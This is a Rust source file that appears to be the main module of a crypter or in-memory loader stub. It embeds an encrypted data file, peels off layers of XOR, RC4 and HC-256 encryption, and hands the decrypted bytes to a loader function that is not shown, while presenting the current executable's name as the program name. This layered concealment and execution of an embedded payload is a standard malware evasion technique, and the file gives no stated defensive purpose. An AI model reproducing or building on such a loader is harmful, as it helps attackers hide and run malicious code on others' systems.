mod handler;
mod helper;
mod rc;
mod walker;

use crate::handler::load;
use crate::rc::State as rcState;
use anyhow::Result;
use hc_256::Hc256;
use hc_256::cipher::{KeyIvInit, StreamCipher};
use std::env;

const ENCRYPTED_DATA: &[u8] = include_bytes!("../data.bin");

fn dbytes() -> Vec<u8> {
    let k = helper::key_bytes();
    let mut buf = ENCRYPTED_DATA.to_vec();
    let xor_len = k.len();
    for i in 0..buf.len() {
        buf[i] ^= k[i % xor_len] ^ 0xAA;
    }
    let mut rc4 = rcState::create(&k);
    rc4.apply(&mut buf);
    let key_fixed = helper::prepare_32_byte_array(&k);
    let mut iv_seed = b"nonce-".to_vec();
    iv_seed.extend_from_slice(&k);
    let iv_fixed = helper::prepare_32_byte_array(&iv_seed);
    let mut hc_cipher = Hc256::new_from_slices(&key_fixed, &iv_fixed).expect("");
    hc_cipher.apply_keystream(&mut buf);
    buf
}

fn prepare_args() -> Vec<String> {
    let args: Vec<String> = env::args().collect();
    let mut target_args = Vec::new();
    let current_exe_name = env::current_exe()
        .ok()
        .and_then(|p| p.file_name().map(|n| n.to_string_lossy().into_owned()))
        .unwrap_or_else(|| "hello world".to_string());
    target_args.push(current_exe_name);
    if args.len() > 1 {
        for arg in args.iter().skip(1) {
            target_args.push(arg.clone());
        }
    }
    target_args
}

fn main() -> Result<()> {
    let target_args = prepare_args();
    let data = dbytes();
    load(data, target_args)?;
    Ok(())
}
